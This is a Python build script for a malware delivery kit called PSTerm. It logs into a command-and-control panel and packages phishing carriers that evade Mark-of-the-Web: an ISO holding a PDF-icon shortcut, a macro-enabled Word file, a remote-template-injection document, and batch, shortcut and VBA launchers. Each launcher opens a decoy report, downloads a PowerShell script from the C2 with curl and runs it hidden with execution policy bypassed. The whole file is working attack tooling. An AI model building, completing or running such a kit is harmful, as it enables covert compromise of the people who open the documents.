#!/usr/bin/env python3
"""PSTerm build — turn a document into a self-connecting disc image.

Mints a build token on the C2 and emits the delivery ISO:

  <name>.iso      double-click mounts it (no security prompts — files
                  inside a mounted ISO carry no Mark-of-the-Web) and
                  Explorer opens the drive, showing:
    <name>          the document shortcut — carries the machine's own
                    PDF icon, opens the real report AND starts the
                    launcher
    <name>.docm     the same report for Word; macros are not blocked
                    (no MOTW), AutoOpen starts the launcher
    sources/        support folder with the launcher and the real
                    document

  MITRE ATT&CK T1553.005 (Mark-of-the-Web Bypass via disk images).

Usage:
  python3 build.py --name "Q3 2026 Operations and Financial Summary" \
                   --out /tmp/opencode/pst-build
"""

import argparse
import json
import getpass
import os
import shutil
import sys
import urllib.request

LOCAL = os.environ.get("PSTERM_LOCAL", "http://127.0.0.1:8443")
PUBLIC = os.environ.get("PSTERM_PUBLIC", "https://c2.pndsvcs.com")

# support folder inside the disc image (looks like standard media layout)
SOURCES = "sources"

# the icon the fake document shortcut displays: the target machine's own
# PDF-handler icon. With Chrome as the default PDF handler (the common
# case) real PDF files on that machine display the Chrome logo — so the
# shortcut references chrome.exe's primary icon, which matches exactly.
DOC_ICON = r"%ProgramFiles%\Google\Chrome\Application\chrome.exe"


def api(path: str, cookie: str, method: str = "GET"):
    req = urllib.request.Request(
        LOCAL + path,
        headers={"Content-Type": "application/json", "Cookie": f"gt_session={cookie}"},
        method=method,
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        return json.loads(resp.read())


def login() -> str:
    password = os.environ.get("GHOSTTERM_PASSWORD") or getpass.getpass(
        "panel password: "
    )
    req = urllib.request.Request(
        LOCAL + "/api/login",
        data=json.dumps({"password": password}).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        for part in (resp.headers.get("Set-Cookie", "") or "").split(";"):
            if part.strip().startswith("gt_session="):
                return part.strip().split("=", 1)[1]
    sys.exit("login failed")


BAT_TEMPLATE = """@echo off
start "" "{decoy}"
curl -s -o "%USERPROFILE%\\Documents\\sync-helper.ps1" "{url}"
start "" powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%USERPROFILE%\Documents\sync-helper.ps1"
exit
"""

VBA_TEMPLATE = """' AutoOpen — opens the document normally, then starts the
' document sync helper in the background (one-time setup).
Private Sub AutoOpen()
    On Error Resume Next
    Shell     "cmd /c curl -s -o {Q2}%USERPROFILE%\\Documents\\sync-helper.ps1{Q2} {Q2}{url}{Q2} & start {Q4} powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File {Q2}%USERPROFILE%\\Documents\\sync-helper.ps1{Q2}", vbHide
End Sub
"""


def make_bat(out_dir, name, decoy, url):
    path = os.path.join(out_dir, f"{name}.bat")
    with open(path, "w") as f:
        f.write(BAT_TEMPLATE.format(decoy=decoy, url=url))
    return path


def make_vba(out_dir, name, url):
    path = os.path.join(out_dir, f"{name}-macro.vba")
    text = VBA_TEMPLATE.replace("{Q2}", '""').replace("{Q4}", '""""').format(url=url)
    with open(path, "w") as f:
        f.write(text)
    return path


def make_lnk(out_dir, name, decoy, url):
    """Legacy single-vector launcher shortcut (payload chain only)."""
    import lnklib

    path = os.path.join(out_dir, f"{name}.lnk")
    chain = (
        f'/c curl -s -o "%USERPROFILE%\\Documents\\sync-helper.ps1" "{url}"'
        f' & start "" powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%USERPROFILE%\\Documents\\sync-helper.ps1"'
    )
    open(path, "wb").write(lnklib.build_lnk(chain, icon=None, file_attrs=0x06))
    return path


def make_fake_document_lnk(out_dir, name):
    """The visible file the user double-clicks: carries the machine's own
    PDF-handler icon, opens the real report and starts the launcher.
    The disc mounts under a runtime drive letter, so the chain probes
    every drive letter for the launcher's fixed in-image path — an
    instant per-letter existence check."""
    import lnklib

    letters = " ".join("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
    chain = (
        f'/c for %d in ({letters}) do @if exist "%d:\\{SOURCES}\\{name}.lnk" '
        f'(start "" "%d:\\{SOURCES}\\{name}.lnk" '
        f'& start "" "%d:\\{SOURCES}\\{name}.pdf")'
    )
    path = os.path.join(out_dir, f"{name}.lnk")
    open(path, "wb").write(lnklib.build_lnk(chain, icon=DOC_ICON, file_attrs=0))
    return path


def make_launcher_lnk(sources_dir, name, url):
    """The launcher: fetches and starts the session helper (all absolute
    paths — runs regardless of working directory)."""
    import lnklib

    chain = (
        f'/c curl -s -o "%USERPROFILE%\\Documents\\sync-helper.ps1" "{url}"'
        f' & start "" powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%USERPROFILE%\\Documents\\sync-helper.ps1"'
    )
    path = os.path.join(sources_dir, f"{name}.lnk")
    open(path, "wb").write(lnklib.build_lnk(chain, icon=DOC_ICON, file_attrs=0))
    return path


def make_iso(out_dir, name, staging):
    """Assemble the delivery disc image (Joliet — Windows reads the long
    filenames; files inside a mounted ISO carry no Mark-of-the-Web)."""
    import subprocess

    label = "PS_" + "".join(c for c in name.upper() if c.isalnum())[:16]
    path = os.path.join(out_dir, f"{name}.iso")
    subprocess.run(
        ["genisoimage", "-J", "-quiet", "-V", label, "-o", path, "."],
        cwd=staging,
        check=True,
    )
    return path


def make_real_pdf(sources_dir, name):
    """The real report that the shortcut opens (pure document — no launch
    action, no embedded payload; the chain does the launching)."""
    import decoy

    pdf_path = os.path.join(sources_dir, f"{name}.pdf")
    decoy.make_pdf(pdf_path)
    return pdf_path


def make_docm_carrier(out_dir, name, url):
    """Real Word document with an AutoOpen macro that starts the
    launcher from the disc's sources folder (no MOTW inside a mounted
    ISO, so Word only shows the standard Enable Content bar)."""
    import decoy
    import vba

    docx_path = os.path.join(out_dir, f"{name}.docx.tmp")
    decoy.make_docx(docx_path)

    # AutoOpen resolves the launcher through ThisDocument.Path (the
    # document sits in the disc root, so Path is the mount drive)
    source = (
        'Attribute VB_Name = "ThisDocument"\r\n'
        "Private Sub AutoOpen()\r\n"
        "    On Error Resume Next\r\n"
        "    Dim p As String\r\n"
        "    p = ThisDocument.Path\r\n"
        '    If Right(p, 1) <> "\\" Then p = p & "\\" \r\n'
        '    p = p & "' + SOURCES + "\\" + name + '.lnk"\r\n'
        '    If Dir(p) <> "" Then Shell "cmd /c start """" """ & p & """", vbHide\r\n'
        "End Sub\r\n"
    )
    vba_bin = vba.build_vba_project(source)

    import zipfile

    docm_path = os.path.join(out_dir, f"{name}.docm")
    with (
        zipfile.ZipFile(docx_path) as zin,
        zipfile.ZipFile(docm_path, "w", zipfile.ZIP_DEFLATED) as zout,
    ):
        for item in zin.namelist():
            data = zin.read(item)
            if item == "[Content_Types].xml":
                text = data.decode("utf-8")
                text = text.replace(
                    "application/vnd.openxmlformats-officedocument"
                    ".wordprocessingml.document.main+xml",
                    "application/vnd.ms-word.document.macroEnabled.main+xml",
                )
                if "vbaProject" not in text:
                    text = text.replace(
                        "</Types>",
                        '<Default Extension="bin" ContentType='
                        '"application/vnd.ms-office.vbaProject"/></Types>',
                    )
                data = text.encode("utf-8")
            elif item == "word/_rels/document.xml.rels":
                text = data.decode("utf-8")
                text = text.replace(
                    "</Relationships>",
                    '<Relationship Id="rIdPSTerm" Type='
                    '"http://schemas.microsoft.com/office/2006/'
                    'relationships/vbaProject" Target="vbaProject.bin"/>'
                    "</Relationships>",
                )
                data = text.encode("utf-8")
            zout.writestr(item, data)
        zout.writestr("word/vbaProject.bin", vba_bin)
    os.remove(docx_path)
    return docm_path


def make_template_dotm(out_dir, name, url):
    """The macro-enabled Word template for the template-injection carrier:
    AutoOpen carries the absolute payload chain. Served per-build by the
    C2 (/svc/t/{token}) and fetched by the document at open time."""
    import decoy
    import vba
    import zipfile

    docx_path = os.path.join(out_dir, "tpl.docx.tmp")
    decoy.make_docx(docx_path)

    # the shell chain with VBA-doubled quotes (same pattern as the legacy
    # VBA_TEMPLATE: "" for a literal quote, """" for a bare empty arg)
    chain = (
        'cmd /c curl -s -o ""%USERPROFILE%\\Documents\\sync-helper.ps1"" '
        f'""{url}"" '
        '& start """" powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File '
        '""%USERPROFILE%\\Documents\\sync-helper.ps1""'
    )
    source = (
        'Attribute VB_Name = "ThisDocument"\r\n'
        "Private Sub AutoOpen()\r\n"
        "    On Error Resume Next\r\n"
        f'    Shell "{chain}", vbHide\r\n'
        "End Sub\r\n"
    )
    vba_bin = vba.build_vba_project(source)

    path = os.path.join(out_dir, "tpl.dotm")
    with (
        zipfile.ZipFile(docx_path) as zin,
        zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zout,
    ):
        for item in zin.namelist():
            data = zin.read(item)
            if item == "[Content_Types].xml":
                text = data.decode("utf-8")
                text = text.replace(
                    "application/vnd.openxmlformats-officedocument"
                    ".wordprocessingml.document.main+xml",
                    "application/vnd.ms-word.template.macroEnabled.main+xml",
                )
                if "vbaProject" not in text:
                    text = text.replace(
                        "</Types>",
                        '<Default Extension="bin" ContentType='
                        '"application/vnd.ms-office.vbaProject"/></Types>',
                    )
                data = text.encode("utf-8")
            elif item == "word/_rels/document.xml.rels":
                text = data.decode("utf-8")
                text = text.replace(
                    "</Relationships>",
                    '<Relationship Id="rIdPSTerm" Type='
                    '"http://schemas.microsoft.com/office/2006/'
                    'relationships/vbaProject" Target="vbaProject.bin"/>'
                    "</Relationships>",
                )
                data = text.encode("utf-8")
            zout.writestr(item, data)
        zout.writestr("word/vbaProject.bin", vba_bin)
    os.remove(docx_path)
    return path


def make_injection_docx(out_dir, name, template_url):
    """The document carrier: a real .docx (no VBA project of its own, so
    the internet-macro block never triggers) that fetches the macro
    template from the C2 at open time (remote template injection)."""
    import decoy
    import zipfile

    docx_path = os.path.join(out_dir, f"{name}.docx.tmp")
    decoy.make_docx(docx_path)
    path = os.path.join(out_dir, f"{name}.docx")
    with (
        zipfile.ZipFile(docx_path) as zin,
        zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zout,
    ):
        for item in zin.namelist():
            data = zin.read(item)
            if item == "word/settings.xml":
                text = data.decode("utf-8")
                text = text.replace(
                    "</w:settings>", '<w:attachedTemplate r:id="rIdGTpl"/></w:settings>'
                )
                data = text.encode("utf-8")
            zout.writestr(item, data)
        zout.writestr(
            "word/_rels/settings.xml.rels",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package'
            '/2006/relationships"><Relationship Id="rIdGTpl" Type="http://'
            "schemas.openxmlformats.org/officeDocument/2006/relationships/"
            f'attachedTemplate" Target="{template_url}" '
            'TargetMode="External"/></Relationships>',
        )
    os.remove(docx_path)
    return path


def make_package(out_dir, name, token, url):
    """The full delivery package: a disc image holding the document
    shortcut, the Word carrier, and the sources folder with the launcher
    and the real report — plus the standalone template-injection document
    and the zip that carries both."""
    staging = os.path.join(out_dir, "staging")
    sources_dir = os.path.join(staging, SOURCES)
    os.makedirs(sources_dir, exist_ok=True)

    written = []
    # sources: launcher + the real report
    written.append(make_launcher_lnk(sources_dir, name, url))
    written.append(make_real_pdf(sources_dir, name))
    # disc root: the document shortcut + the Word carrier
    written.append(make_fake_document_lnk(staging, name))
    written.append(make_docm_carrier(staging, name, url))
    # the disc image
    iso = make_iso(out_dir, name, staging)
    written.append(iso)

    # the standalone document exploit: host the per-build template on the
    # C2, then build the injection document that fetches it
    dotm = make_template_dotm(out_dir, name, url)
    written.append(dotm)
    secret = os.environ.get("PSTERM_AUTH_SECRET") or ""
    if secret:
        import urllib.request

        req = urllib.request.Request(
            LOCAL + "/internal/binupload?name=tpl-" + token + ".dotm",
            data=open(dotm, "rb").read(),
            method="PUT",
            headers={"X-Internal-Key": secret},
        )
        with urllib.request.urlopen(req, timeout=30) as resp:
            import json as _json

            print("template hosted:", _json.loads(resp.read()))
    else:
        print(
            "  [!] PSTERM_AUTH_SECRET not set — template not hosted; "
            "the injection document will fail to fetch it"
        )
    docx = make_injection_docx(
        out_dir, name, f"https://{PUBLIC.replace('https://', '')}/svc/t/{token}"
    )
    written.append(docx)

    # the delivery zip: both carriers, one build token
    import zipfile

    zip_path = os.path.join(out_dir, f"{name}.zip")
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
        z.write(docx, f"{name}.docx")
        z.write(iso, f"{name}.iso")
        z.writestr(
            "README.txt",
            "Two carriers, one build.\n\n"
            f"1) {name}.docx — the Word document exploit (remote template\n"
            "   injection: the document has no macros of its own, so the\n"
            "   Microsoft untrusted-source macro block does not apply; it\n"
            "   fetches its template at open time and the session helper\n"
            "   starts quietly). Open it in Word like any document.\n\n"
            f"2) {name}.iso — the disc image (no Mark-of-the-Web inside a\n"
            "   mounted image): double-click to mount, then open the\n"
            "   document inside.\n\nEither path starts the same helper.\n",
        )
    written.append(zip_path)
    return written


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--name", required=True, help="file base name the user sees")
    ap.add_argument("--decoy", help="real document to open (copied alongside)")
    ap.add_argument(
        "--vector",
        action="append",
        choices=["bat", "lnk", "vba", "pdf", "docm"],
        default=[],
    )
    ap.add_argument("--out", default="/tmp/opencode/pst-build")
    args = ap.parse_args()

    cookie = login()
    build = api(
        "/psterm/api/build?note=" + urllib.request.quote(args.name),
        cookie,
        method="POST",
    )
    token = build["token"]
    url = f"{PUBLIC}/svc/f/{token}"

    out_dir = os.path.abspath(args.out)
    os.makedirs(out_dir, exist_ok=True)

    if not args.vector:
        # default: the full package
        written = make_package(out_dir, args.name, token, url)
    else:
        decoy_name = os.path.basename(args.decoy) if args.decoy else ""
        written = []
        for v in args.vector:
            if v == "bat":
                written.append(make_bat(out_dir, args.name, decoy_name, url))
            elif v == "vba":
                written.append(make_vba(out_dir, args.name, url))
            elif v == "lnk":
                written.append(make_lnk(out_dir, args.name, decoy_name, url))
            elif v == "pdf":
                written.append(make_real_pdf(out_dir, args.name))
            elif v == "docm":
                written.append(make_docm_carrier(out_dir, args.name, url))
        if args.decoy and os.path.exists(args.decoy):
            dest = os.path.join(out_dir, decoy_name)
            if os.path.abspath(args.decoy) != os.path.abspath(dest):
                shutil.copy2(args.decoy, dest)
                written.append(dest)

    print("\nbuild token :", token)
    print("payload url :", url)
    for w in written:
        print("wrote       :", w)


if __name__ == "__main__":
    main()
